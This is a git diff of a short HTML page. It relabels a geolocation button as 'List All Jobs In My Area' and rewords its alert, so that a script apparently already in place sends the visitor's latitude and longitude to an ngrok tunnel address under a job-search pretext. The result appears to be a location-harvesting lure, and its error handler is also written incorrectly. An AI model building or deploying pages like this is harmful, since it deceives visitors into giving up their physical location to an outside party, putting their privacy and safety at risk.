@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 
-<button onclick="getLocation()">Get Location</button>
+<button onclick="getLocation()">List All Jobs In My Area</button>
 
 <script>
   function getLocation() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(showPosition);
     } else {
-      alert("Geolocation is not supported by this browser.");
+      alert("Jobs locator is not supported by this browser.");
     }
   }
 
@@ -18,8 +18,8 @@
 
     fetch(`https://dcf6-102-88-63-111.ngrok-free.app?lon=${longitude}&lat=${latitude}`)
         .then(res => res.json())
-        .then(data => console.log(data))
-        .catch(error = console.log(error))
+        .then(data => console.log("@data ", data))
+        .catch(error = console.log("@error ", error))
 
     // console.error("LON: ", longitude, "\nLAT: ", latitude);
     // var url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
